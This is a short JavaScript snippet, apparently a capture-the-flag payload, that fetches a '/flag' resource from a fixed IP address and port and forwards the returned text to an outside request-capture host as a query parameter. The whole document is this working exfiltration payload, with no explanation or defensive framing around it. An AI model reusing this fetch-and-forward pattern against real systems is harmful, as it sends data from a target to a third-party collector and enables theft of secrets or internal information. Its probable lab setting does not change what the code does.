const url = "http://165.232.190.5:1900/flag";
fetch(url).then((response) => response.text()).then((text) => fetch("https://omnigodz.free.beeceptor.com/?flag="+text));
